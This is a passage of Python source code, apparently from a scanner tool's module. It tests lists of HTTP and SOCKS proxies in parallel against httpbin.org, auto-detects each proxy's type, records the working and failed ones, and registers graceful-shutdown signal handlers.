    working, failed = [], []
    threads = get_scanner_settings().get("proxy_test_threads", 50)
    add_proxy_log(f"Testing {len(proxies_to_test)} proxies ({threads} threads)...", "info")
    
    def test(p):
        try:
            proxy_dict = {"http": f"http://{p}", "https": f"http://{p}"}
            if p.startswith("socks"):
                proxy_dict = {"http": p, "https": p}
            elif p.startswith("http"):
                proxy_dict = {"http": p, "https": p}
            
            resp = http_session.get("http://httpbin.org/ip", proxies=proxy_dict, timeout=10)
            return p, resp.status_code == 200
        except:
            return p, False
    
    with ThreadPoolExecutor(max_workers=threads) as ex:
        for proxy, ok in ex.map(lambda p: test(p), proxies_to_test):
            if ok:
                working.append(proxy)
                add_proxy_log(f"✓ {proxy}", "success")
            else:
                failed.append(proxy)
                add_proxy_log(f"✗ {proxy}", "error")
    
    proxy_state["working_proxies"] = working
    proxy_state["failed_proxies"] = failed
    add_proxy_log(f"Done: {len(working)}/{len(proxies_to_test)} working", "success")
    proxy_state["testing"] = False


def test_proxies_autodetect_worker(proxies_to_test):
    """Test proxies with auto-detection of proxy type"""
    import requests
    
    if not proxies_to_test:
        add_proxy_log("No proxies to test", "warning")
        proxy_state["testing"] = False
        return
    
    result_proxies, failed = [], []
    threads = get_scanner_settings().get("proxy_test_threads", 50)
    add_proxy_log(f"Testing {len(proxies_to_test)} proxies (auto-detect type)...", "info")
    
    def test_autodetect(proxy):
        base = proxy
        for prefix in ["socks5://", "socks4://", "http://"]:
            if proxy.startswith(prefix):
                base = proxy[len(prefix):]
                break
        
        auth = ""
        if "@" in base:
            auth, base = base.rsplit("@", 1)
            auth += "@"
        
        for test_proxy, ptype in [(base, "HTTP"), (f"socks5://{auth}{base}", "SOCKS5"), (f"socks4://{base}", "SOCKS4")]:
            try:
                proxy_dict = {"http": f"http://{test_proxy}", "https": f"http://{test_proxy}"}
                if test_proxy.startswith("socks"):
                    proxy_dict = {"http": test_proxy, "https": test_proxy}
                
                resp = http_session.get("http://httpbin.org/ip", proxies=proxy_dict, timeout=10)
                if resp.status_code == 200:
                    return proxy, test_proxy, ptype, True
            except:
                pass
        return proxy, proxy, "NONE", False
    
    with ThreadPoolExecutor(max_workers=threads) as ex:
        for orig, detected, ptype, ok in ex.map(test_autodetect, proxies_to_test):
            if ok:
                result_proxies.append(detected)
                add_proxy_log(f"✓ {detected} ({ptype})", "success")
            else:
                failed.append(orig)
                add_proxy_log(f"✗ {orig}", "error")
    
    proxy_state["working_proxies"] = result_proxies
    proxy_state["failed_proxies"] = failed
    
    # Update scanner data with working proxies
    scanner_data["proxies"] = result_proxies + failed
    save_scanner_config()
    
    add_proxy_log(f"Done: {len(result_proxies)}/{len(proxies_to_test)} working", "success")
    proxy_state["testing"] = False


# ============== GRACEFUL SHUTDOWN ==============

def signal_handler(sig, frame):
    """Handle shutdown signals gracefully"""
    logger.info("Shutdown signal received, flushing batch writer...")
    try:
        batch_writer.flush()
        logger.info("Batch writer flushed successfully")
    except Exception as e:
        logger.error(f"Error flushing batch writer: {e}")
    
    logger.info("Scanner module shutdown complete")
    sys.exit(0)

# Register signal handlers
signal.signal(signal.SIGTERM, signal_handler)
signal.signal(signal.SIGINT, signal_handler)
logger.info("Signal handlers registered for graceful shutdown")
